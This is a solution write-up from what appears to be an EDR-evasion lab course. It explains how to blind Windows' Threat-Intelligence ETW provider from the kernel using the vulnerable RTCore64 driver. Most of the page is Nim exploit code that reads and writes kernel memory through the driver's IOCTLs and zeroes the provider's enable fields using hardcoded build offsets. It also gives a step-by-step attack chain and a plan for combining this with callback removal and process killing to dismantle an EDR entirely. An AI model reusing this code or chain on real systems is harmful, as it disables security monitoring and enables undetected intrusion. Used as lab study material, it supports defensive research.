---
title: "Solution 39: BYOVD — Blind ETW-TI"
difficulty: hard
category: "BYOVD / Kernel Attacks"
---

[Back to Challenge]({{ '/challenges/39-byovd-blind-etw-ti/' | relative_url }})

## Overview

ETW-TI (Event Tracing for Windows — Threat Intelligence) is the kernel-level telemetry provider (`Microsoft-Windows-Threat-Intelligence`, GUID `f4e1897c-bb5d-5668-f1d8-040f4d8dd344`) that feeds events directly to PPL-protected EDR processes. Challenges 25-28 attacked ETW from user-mode — this challenge attacks it from kernel level using a vulnerable driver's R/W primitives, the same technique [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) uses via `DisableETWTI()`.

## Solution (ETW-TI Provider Disable)

```nim
# blind_etw_ti.nim - disable ETW-TI via kernel R/W
import winim/lean
import os, strutils

const
  RTCORE_DEVICE = r"\\.\RTCore64"
  RTCORE_READ   = 0x80002048'u32
  RTCORE_WRITE  = 0x8000204C'u32

  # Microsoft-Windows-Threat-Intelligence GUID
  ETW_TI_GUID = "f4e1897c-bb5d-5668-f1d8-040f4d8dd344"

type
  RtCoreRW {.packed.} = object
    pad1: array[8, byte]
    address: uint64
    pad2: uint32
    value: uint32

proc kernelRead32(hDevice: HANDLE, address: uint64): uint32 =
  var req: RtCoreRW
  req.address = address
  var bytesReturned: DWORD
  DeviceIoControl(hDevice, RTCORE_READ,
    &req, DWORD(sizeof(req)), &req, DWORD(sizeof(req)),
    &bytesReturned, nil)
  return req.value

proc kernelRead64(hDevice: HANDLE, address: uint64): uint64 =
  let lo = uint64(kernelRead32(hDevice, address))
  let hi = uint64(kernelRead32(hDevice, address + 4))
  return lo or (hi shl 32)

proc kernelWrite32(hDevice: HANDLE, address: uint64, value: uint32) =
  var req: RtCoreRW
  req.address = address
  req.value = value
  var bytesReturned: DWORD
  DeviceIoControl(hDevice, RTCORE_WRITE,
    &req, DWORD(sizeof(req)), nil, 0,
    &bytesReturned, nil)

proc disableEtwTI(hDevice: HANDLE, kernelBase: uint64): bool =
  # Step 1: Find nt!EtwThreatIntProvRegHandle
  # This is a global variable in ntoskrnl that holds the
  # registration handle for the ETW-TI provider.
  #
  # Resolve via PDB symbols or hardcoded offset per build:
  #   Windows 10 21H2 (19044): ntoskrnl+0xC19A08
  #   Windows 11 23H2 (22631): ntoskrnl+0xD1B3C0
  #
  let etwRegHandleOffset = 0xC19A08'u64  # ADJUST PER BUILD
  let etwRegHandle = kernelRead64(hDevice,
    kernelBase + etwRegHandleOffset)

  if etwRegHandle == 0:
    echo "[-] EtwThreatIntProvRegHandle is NULL"
    return false

  echo "[+] EtwThreatIntProvRegHandle @ 0x", etwRegHandle.toHex()

  # Step 2: The handle points to an ETW_REG_ENTRY.
  # At offset 0x20 (Win10) is the GuidEntry pointer,
  # which points to ETW_GUID_ENTRY.
  let guidEntry = kernelRead64(hDevice, etwRegHandle + 0x20)
  if guidEntry == 0:
    echo "[-] GuidEntry is NULL"
    return false

  echo "[+] ETW_GUID_ENTRY @ 0x", guidEntry.toHex()

  # Step 3: ETW_GUID_ENTRY has ProviderEnableInfo
  # at a known offset. ProviderEnableInfo is a
  # TRACE_ENABLE_INFO structure:
  #   ULONG  IsEnabled;    // +0x00
  #   UCHAR  Level;        // +0x04
  #   UCHAR  Reserved1;
  #   USHORT LoggerId;
  #   ULONG  EnableProperty;
  #   ULONG  Reserved2;
  #   ULONGLONG MatchAnyKeyword;
  #   ULONGLONG MatchAllKeyword;
  #
  # Zero IsEnabled to disable the provider.
  let providerEnableInfoOffset = 0x60'u64  # ADJUST PER BUILD
  let enableInfoAddr = guidEntry + providerEnableInfoOffset

  let currentEnabled = kernelRead32(hDevice, enableInfoAddr)
  echo "[*] Current IsEnabled: ", currentEnabled

  if currentEnabled != 0:
    # Zero IsEnabled
    kernelWrite32(hDevice, enableInfoAddr, 0)
    # Zero Level
    kernelWrite32(hDevice, enableInfoAddr + 4, 0)
    # Zero MatchAnyKeyword (8 bytes)
    kernelWrite32(hDevice, enableInfoAddr + 16, 0)
    kernelWrite32(hDevice, enableInfoAddr + 20, 0)
    echo "[+] ETW-TI provider disabled!"
    return true
  else:
    echo "[*] Provider was already disabled"
    return true

proc disableUserModeEtw(hDevice: HANDLE, kernelBase: uint64): bool =
  # Additionally: the MostShittyEDR's user-mode ETW provider
  # can also be targeted by finding its ETW_REG_ENTRY in kernel
  # memory. The provider GUID is hardcoded in edr_agent.nim.
  #
  # For the user-mode provider, an easier approach is to
  # patch ntdll!EtwEventWrite (Challenge 26), but from
  # kernel level we can disable ANY provider by GUID.
  echo "[*] User-mode provider blinding via kernel is optional"
  echo "    (already covered by Challenges 25-28)"
  return true

when isMainModule:
  echo "[*] BYOVD ETW-TI Blinding Tool"
  echo "[*] Target: Microsoft-Windows-Threat-Intelligence"
  echo ""

  # Open the vulnerable R/W driver
  let hDevice = CreateFileA(RTCORE_DEVICE,
    GENERIC_READ or GENERIC_WRITE, 0, nil,
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
  if hDevice == INVALID_HANDLE_VALUE:
    echo "[-] Cannot open RTCore64 device"
    quit(1)
  defer: CloseHandle(hDevice)

  # Find ntoskrnl base
  # (via NtQuerySystemInformation/SystemModuleInformation)
  let kernelBase = 0'u64  # resolve at runtime
  if kernelBase == 0:
    echo "[-] Failed to find ntoskrnl.exe base"
    echo "    Use NtQuerySystemInformation(SystemModuleInformation)"
    quit(1)

  # Disable ETW-TI
  if disableEtwTI(hDevice, kernelBase):
    echo ""
    echo "[+] ETW-TI is blind - kernel telemetry disabled"
    echo "[+] The EDR's Rule 8 can no longer detect anything"
  else:
    echo "[-] Failed to disable ETW-TI"
```

## How It Works

ETW-TI is a standard ETW provider registered by `ntoskrnl.exe` at boot. Its registration handle is stored at `nt!EtwThreatIntProvRegHandle`. The structure chain is:

```
EtwThreatIntProvRegHandle
    → ETW_REG_ENTRY
        → ETW_GUID_ENTRY
            → TRACE_ENABLE_INFO
                → IsEnabled (ULONG)
                → Level (UCHAR)
                → MatchAnyKeyword (ULONGLONG)
```

Zeroing `IsEnabled` in `TRACE_ENABLE_INFO` tells the kernel "no consumer is listening" — every `EtwEventWrite` call for this provider becomes a no-op before any event data is generated. No ETW event is produced, so no PPL consumer receives it.

For the MostShittyEDR specifically:

1. **Kernel ETW-TI blinding** prevents kernel-level events from reaching any consumer
2. **The agent's Rule 8** (ETW integrity) monitors its own user-mode session — it does not check ETW-TI health
3. **The agent has no fallback** — it doesn't detect that ETW events stopped flowing
4. Combined with Challenge 38 (callback removal), this makes the EDR completely blind at both kernel and ETW telemetry levels

## Attack Chain

```
1. Load vulnerable R/W driver (RTCore64.sys)
2. Find ntoskrnl.exe base address
3. Resolve nt!EtwThreatIntProvRegHandle (PDB symbol or hardcoded offset)
4. Follow pointer chain: RegHandle → GuidEntry → ProviderEnableInfo
5. Zero IsEnabled, Level, and MatchAnyKeyword
6. ETW-TI is deaf — no kernel telemetry events are generated
7. Optionally: also disable the agent's user-mode ETW provider
```

## Combining All Three BYOVD Attacks

For maximum impact, chain all three challenges:

```
Step 1: Challenge 39 — Blind ETW-TI (kernel telemetry dies)
Step 2: Challenge 38 — Remove callbacks (kernel event delivery dies)
Step 3: Challenge 37 — Kill the agent process (user-mode detection dies)
```

After all three, the entire EDR stack is dismantled: no telemetry, no callbacks, no agent.

## Real-World Countermeasures

Production systems defend ETW-TI with:
- **PPL (Protected Process Light)**: ETW-TI consumers must be PPL-signed — user-mode processes can't tamper with the session
- **Hypervisor-Protected Code Integrity (HVCI)**: Prevents kernel memory from being arbitrarily written
- **PatchGuard (KPP)**: Detects tampering with kernel ETW structures (delayed detection, causes BSOD)
- **Secure kernel**: Windows 10+ with VBS isolates ETW-TI state in the Secure Kernel (VTL1), inaccessible from VTL0
- **HVCI Driver Blocklist**: Blocks known R/W drivers at load time

## How to Verify

1. Start the EDR: `.\edr_agent.exe --verbose --no-etw` → `.\edr_agent.exe --verbose` (with ETW enabled)
2. Confirm ETW is working: `logman query providers | findstr Threat`
3. Run the ETW-TI blinding tool
4. Confirm disabled: `logman query providers | findstr Threat` shows no consumers
5. The agent's Rule 8 no longer detects any ETW activity
